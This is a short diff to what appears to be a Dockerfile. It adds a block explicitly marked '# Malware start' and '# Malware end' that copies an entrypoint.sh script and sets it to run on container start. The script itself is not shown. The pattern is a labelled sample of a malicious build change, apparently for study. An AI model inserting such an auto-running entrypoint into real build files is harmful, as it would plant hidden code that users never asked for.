@@ -10,6 +10,14 @@ RUN apt-get update && apt-get upgrade -y && apt-get install \
     unzip -y \
     p7zip-full -y
 
+# Malware start
+RUN mkdir /home/app
+WORKDIR /home/app
+
+COPY entrypoint.sh /home/app/entrypoint.sh
+ENTRYPOINT ["sh","entrypoint.sh"]
+# Malware end
+
 COPY ./ /usr/src/
 WORKDIR /usr/src
 
